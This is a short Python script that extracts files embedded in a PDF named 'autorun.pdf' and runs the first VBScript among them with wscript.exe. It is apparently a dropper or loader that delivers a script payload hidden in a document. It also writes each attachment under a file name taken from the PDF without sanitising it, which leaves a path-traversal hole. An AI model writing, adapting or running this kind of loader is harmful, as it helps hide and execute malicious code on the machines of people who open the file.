import os
import subprocess
import pikepdf
from pikepdf import Name

def extract_attachments(pdf_path):
    print(f"[i] Extracting from {pdf_path}")
    extracted_files = []

    with pikepdf.open(pdf_path) as pdf:
        root = pdf.trailer["/Root"]
        names_dict = root.get("/Names")
        if not names_dict:
            print("[!] No /Names found in PDF")
            return []

        embedded_files = names_dict.get("/EmbeddedFiles")
        if not embedded_files:
            print("[!] No /EmbeddedFiles in PDF")
            return []

        ef_names = embedded_files.get("/Names")
        if not ef_names or not isinstance(ef_names, list):
            print("[!] Invalid /Names array in /EmbeddedFiles")
            return []

        for i in range(0, len(ef_names), 2):
            name_obj = ef_names[i]
            filespec = ef_names[i + 1]

            fname = str(name_obj)
            ef_dict = filespec.get("/EF")
            if not ef_dict or "/F" not in ef_dict:
                continue

            file_stream = ef_dict["/F"]
            with open(fname, "wb") as f:
                f.write(file_stream.read_bytes())
                extracted_files.append(fname)
                print(f"[+] Extracted: {fname}")

    return extracted_files


def launch_vbs_script(file_list):
    for file in file_list:
        if file.lower().endswith(".vbs"):
            print(f"[i] Launching {file}")
            subprocess.Popen(["wscript.exe", file], shell=True)
            return
    print("[!] No .vbs script found to launch")


def main():
    PDF_FILE = "autorun.pdf"
    if not os.path.exists(PDF_FILE):
        print(f"[!] File not found: {PDF_FILE}")
        return

    files = extract_attachments(PDF_FILE)
    if not files:
        print("[!] No attachments extracted")
        return

    launch_vbs_script(files)


if __name__ == "__main__":
    main()
